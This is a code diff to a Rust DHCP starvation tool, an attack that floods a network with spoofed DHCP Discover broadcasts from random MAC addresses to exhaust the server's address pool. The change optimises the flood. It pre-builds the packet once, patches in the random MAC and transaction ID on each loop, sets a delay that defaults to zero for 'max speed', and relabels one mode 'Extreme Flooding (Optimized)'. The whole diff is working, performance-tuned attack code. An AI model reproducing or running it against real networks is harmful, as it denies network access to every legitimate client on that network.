@@ -135,7 +135,12 @@ fn set_network_settings(config: &mut DhcpStarvationConfig) {
         },
         2 => {
             config.mode = StarvationMode::FullStarvation;
-            config.delay_ms = 10; // Minimal delay to allow listener to process
+            let delay_input: String = Input::with_theme(&ColorfulTheme::default())
+                .with_prompt("Delay between packets (ms) [0 for max speed]")
+                .default("0".to_string())
+                .interact_text()
+                .unwrap();
+            config.delay_ms = delay_input.parse().unwrap_or(0);
         },
         _ => unreachable!(),
     }
@@ -153,7 +158,7 @@ fn start_starvation(config: &DhcpStarvationConfig) {
     println!("Starting DHCP Starvation on {}...", interface.name);
     match config.mode {
         StarvationMode::Simple => println!("Mode: Simple (Delay: {}ms)", config.delay_ms),
-        StarvationMode::ExtremeFlooding => println!("Mode: Extreme Flooding"),
+        StarvationMode::ExtremeFlooding => println!("Mode: Extreme Flooding (Optimized)"),
         StarvationMode::FullStarvation => println!("Mode: Full Starvation (DORA)"),
     }
     println!("Press Ctrl+C to stop.");
@@ -201,6 +206,66 @@ fn start_starvation(config: &DhcpStarvationConfig) {
         });
     }
 
+    // --- Optimization: Pre-build the packet ---
+    let mut packet_buffer = [0u8; 342];
+    
+    // Initialize static parts once
+    {
+        let mut ethernet_packet = MutableEthernetPacket::new(&mut packet_buffer).unwrap();
+        ethernet_packet.set_destination(MacAddr::broadcast());
+        ethernet_packet.set_ethertype(EtherTypes::Ipv4);
+
+        let mut ipv4_packet = MutableIpv4Packet::new(ethernet_packet.payload_mut()).unwrap();
+        ipv4_packet.set_version(4);
+        ipv4_packet.set_header_length(5);
+        ipv4_packet.set_total_length(328);
+        ipv4_packet.set_ttl(64);
+        ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
+        ipv4_packet.set_source(Ipv4Addr::new(0, 0, 0, 0));
+        ipv4_packet.set_destination(Ipv4Addr::new(255, 255, 255, 255));
+        ipv4_packet.set_checksum(checksum(&ipv4_packet.to_immutable()));
+
+        let mut udp_packet = MutableUdpPacket::new(ipv4_packet.payload_mut()).unwrap();
+        udp_packet.set_source(68);
+        udp_packet.set_destination(67);
+        udp_packet.set_length(308);
+
+        let payload = udp_packet.payload_mut();
+        // Clear payload
+        for b in payload.iter_mut() { *b = 0; }
+
+        payload[0] = 1; // Boot Request
+        payload[1] = 1; // Ethernet
+        payload[2] = 6; // HW Len
+        payload[3] = 0; // Hops
+        // XID (4-7) will be set in loop
+        // CHADDR (28-33) will be set in loop
+
+        // Magic Cookie
+        payload[236] = 0x63;
+        payload[237] = 0x82;
+        payload[238] = 0x53;
+        payload[239] = 0x63;
+
+        // Options
+        let mut cursor = 240;
+        // Option 53: Message Type (Discover = 1)
+        payload[cursor] = 53;
+        payload[cursor+1] = 1;
+        payload[cursor+2] = 1;
+        cursor += 3;
+        // Option 55: Parameter Request List
+        payload[cursor] = 55;
+        payload[cursor+1] = 4;
+        payload[cursor+2] = 1; // Subnet Mask
+        payload[cursor+3] = 3; // Router
+        payload[cursor+4] = 6; // DNS
+        payload[cursor+5] = 15; // Domain Name
+        cursor += 6;
+        // End Option
+        payload[cursor] = 255;
+    }
+
     loop {
         // Generate random MAC
         let mut mac_bytes = [0u8; 6];
@@ -212,7 +277,35 @@ fn start_starvation(config: &DhcpStarvationConfig) {
         let mut xid = [0u8; 4];
         rng.fill(&mut xid);
 
-        send_dhcp_discover(&mut *tx, src_mac, &xid);
+        // Update dynamic parts
+        {
+            let mut ethernet_packet = MutableEthernetPacket::new(&mut packet_buffer).unwrap();
+            ethernet_packet.set_source(src_mac);
+
+            let mut ipv4_packet = MutableIpv4Packet::new(ethernet_packet.payload_mut()).unwrap();
+            let mut udp_packet = MutableUdpPacket::new(ipv4_packet.payload_mut()).unwrap();
+            let payload = udp_packet.payload_mut();
+
+            // Update XID
+            payload[4] = xid[0];
+            payload[5] = xid[1];
+            payload[6] = xid[2];
+            payload[7] = xid[3];
+
+            // Update CHADDR
+            let mac_octets = src_mac.octets();
+            payload[28] = mac_octets[0];
+            payload[29] = mac_octets[1];
+            payload[30] = mac_octets[2];
+            payload[31] = mac_octets[3];
+            payload[32] = mac_octets[4];
+            payload[33] = mac_octets[5];
+
+            // Recalculate UDP Checksum
+            udp_packet.set_checksum(ipv4_checksum(&udp_packet.to_immutable(), &Ipv4Addr::new(0,0,0,0), &Ipv4Addr::new(255, 255, 255, 255)));
+        }
+
+        tx.send_to(&packet_buffer, None);
         
         if config.mode == StarvationMode::Simple {
             if config.delay_ms > 0 {
@@ -388,91 +481,4 @@ fn send_dhcp_request(
     // print!("r"); // Indicate request sent
     // use std::io::Write;
     // std::io::stdout().flush().unwrap();
-}
-
-fn send_dhcp_discover(
-    tx: &mut dyn datalink::DataLinkSender,
-    src_mac: MacAddr,
-    xid: &[u8]
-) {
-    let mut ethernet_buffer = [0u8; 342]; 
-    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
-
-    ethernet_packet.set_destination(MacAddr::broadcast());
-    ethernet_packet.set_source(src_mac);
-    ethernet_packet.set_ethertype(EtherTypes::Ipv4);
-
-    let mut ipv4_packet = MutableIpv4Packet::new(ethernet_packet.payload_mut()).unwrap();
-    ipv4_packet.set_version(4);
-    ipv4_packet.set_header_length(5);
-    ipv4_packet.set_total_length(328); 
-    ipv4_packet.set_ttl(64);
-    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
-    ipv4_packet.set_source(Ipv4Addr::new(0, 0, 0, 0));
-    ipv4_packet.set_destination(Ipv4Addr::new(255, 255, 255, 255));
-    ipv4_packet.set_checksum(checksum(&ipv4_packet.to_immutable()));
-
-    let mut udp_packet = MutableUdpPacket::new(ipv4_packet.payload_mut()).unwrap();
-    udp_packet.set_source(68);
-    udp_packet.set_destination(67);
-    udp_packet.set_length(308); 
-    
-    let payload = udp_packet.payload_mut();
-    // Clear
-    for b in payload.iter_mut() { *b = 0; }
-
-    payload[0] = 1; // Boot Request
-    payload[1] = 1; // Ethernet
-    payload[2] = 6; // HW Len
-    payload[3] = 0; // Hops
-    
-    // XID
-    payload[4] = xid[0];
-    payload[5] = xid[1];
-    payload[6] = xid[2];
-    payload[7] = xid[3];
-
-    // CHADDR (Client HW Addr)
-    let mac_octets = src_mac.octets();
-    payload[28] = mac_octets[0];
-    payload[29] = mac_octets[1];
-    payload[30] = mac_octets[2];
-    payload[31] = mac_octets[3];
-    payload[32] = mac_octets[4];
-    payload[33] = mac_octets[5];
-
-    // Magic Cookie
-    payload[236] = 0x63;
-    payload[237] = 0x82;
-    payload[238] = 0x53;
-    payload[239] = 0x63;
-
-    // Options
-    let mut cursor = 240;
-
-    // Option 53: Message Type (Discover = 1)
-    payload[cursor] = 53;
-    payload[cursor+1] = 1;
-    payload[cursor+2] = 1;
-    cursor += 3;
-
-    // Option 55: Parameter Request List
-    payload[cursor] = 55;
-    payload[cursor+1] = 4;
-    payload[cursor+2] = 1; // Subnet Mask
-    payload[cursor+3] = 3; // Router
-    payload[cursor+4] = 6; // DNS
-    payload[cursor+5] = 15; // Domain Name
-    cursor += 6;
-
-    // End Option
-    payload[cursor] = 255;
-
-    // UDP Checksum
-    udp_packet.set_checksum(ipv4_checksum(&udp_packet.to_immutable(), &Ipv4Addr::new(0,0,0,0), &Ipv4Addr::new(255, 255, 255, 255)));
-
-    tx.send_to(ethernet_packet.packet(), None);
-    print!(".");
-    use std::io::Write;
-    std::io::stdout().flush().unwrap();
 }
